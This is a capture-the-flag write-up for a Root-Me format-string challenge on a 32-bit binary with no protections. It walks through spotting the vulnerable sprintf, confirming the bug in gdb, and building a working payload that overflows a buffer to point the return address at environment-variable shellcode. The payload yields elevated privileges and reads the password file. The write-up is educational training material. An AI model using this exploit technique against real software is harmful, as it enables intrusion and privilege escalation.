# ELF x86 - Format string bug basic 3
https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-3
```
Environment configuration :
PIE 	Position Independent Executable 	 No
RelRO 	Read Only relocations 	                 No
NX 	Non-Executable Stack 	                 No
ASLR 	Address Space Layout Randomization 	 No
SF 	Source Fortification 	                 No
SSP 	Stack-Smashing Protection 	         No
SRC 	Source code access 	                 Yes

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch17@challenge02.root-me.org  
Username	app-systeme-ch17
Password	app-systeme-ch17
```

After a quick look at the source code, the vulnerable code can be spotted at
line 31, which contains a **sprintf** function with controllable format string:
```c
char    outbuf[512];
char    buffer[512];
char    user[12];
[... snip ...]

fgets(user, sizeof(user), stdin);
user[strlen(user) - 1] = '\0';
[... snip ...]

sprintf (buffer, "ERR Wrong user: %400s", user);
sprintf (outbuf, buffer);
```
First, let's verify it:
```gdb
(gdb) break *0x0804854f
Breakpoint 1 at 0x804854f
(gdb) run
Starting program: /challenge/app-systeme/ch17/ch17
Username: %p

Breakpoint 1, 0x0804854f in main ()
(gdb) x/1s 0xbffff97c
0xbffff97c:	"ERR Wrong user:", ' ' <repeats 185 times>...
(gdb) x/1s 0xbffffa35
0xbffffa35:	' ' <repeats 200 times>...
(gdb) x/1s 0xbffffb00
0xbffffb00:	' ' <repeats 26 times>, "0xbffff770"
```

Well, it prints an address from the stack.<br>
However, it seems there are 2 limitations:
1. The user's input is limited to 12 - (null byte) - (last byte set to null) =
10 bytes.
2. Before calling the vulnerable **sprintf**, the user input is transformed into
a fixed-size 416 bytes buffer (```ERR Wrong user: %400s```).

The first limitation pretty much disqualifies the exploit:
```
        4 bytes      2-6 bytes   +2 bytes
  < write address > < padding > <   %n    >
```
Then, we'll need to find an other way to exploit this program.<br>
I don't know any shellcode that spawns a shell, with less than 10 bytes.
Therefore, it can be guessed that the shellcode should be in an environment
variable.<br><br>

If you'll look closely at the code:
```c
sprintf (buffer, "ERR Wrong user: %400s", user);
sprintf (outbuf, buffer);
```
You may notice that there is an overflow.<br>
Let's say the user input is "%200xAAAA". Then **buffer** is set to
```ERR Wrong user: <400-8 whitespaces>%200xAAAA```.<br>
Then, **outbuf** is set to
```ERR Wrong user: <400-8 whitespaces><200 bytes>AAAA```. But, the length of the
buffer is set to 512 (while it has 611 bytes).

So, we've got a plan:
1. Set an environment variable with out shellcode (let's call it SHELLCODE).
2. Find the variable's address (using getenv.c - in our case it's 0xbffffd86).
3. Overwrite the return address.
4. Profit!

After few tries in gdb:
```gdb
(gdb) break *main+240
Breakpoint 1 at 0x8048584
(gdb) run < <(python -c "print '%121x' + '\x86\xfd\xff\xbf'")
Starting program: /challenge/app-systeme/ch17/ch17 < <(python -c "print '%121x' + '\x86\xfd\xff\xbf'")
Username: Bad username: %121x����

Breakpoint 1, 0x08048584 in main ()
(gdb) info registers
eax            0x0	0
ecx            0x0	0
edx            0xb7fd1898	-1208149864
ebx            0xb7fd0000	-1208156160
esp            0xbffffb5c	0xbffffb5c
ebp            0x30343766	0x30343766
esi            0x0	0
edi            0x66666662	1717986914
eip            0x8048584	0x8048584 <main+240>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/1x 0xbffffb5c
0xbffffb5c:	0xbffffd86
```
Well it worked (the return address is set to the variable's address).<br>
Now let's try it outside of gdb:
```sh
app-systeme-ch17@challenge02:~$ (python -c "print '%121x' + '\x86\xfd\xff\xbf'";cat) | ./ch17
Username: Bad username: %121x����
id
uid=1117(app-systeme-ch17) gid=1117(app-systeme-ch17) euid=1217(app-systeme-ch17-cracked) groups=1217(app-systeme-ch17-cracked),100(users),1117(app-systeme-ch17)
cat .passwd
<censored>
```
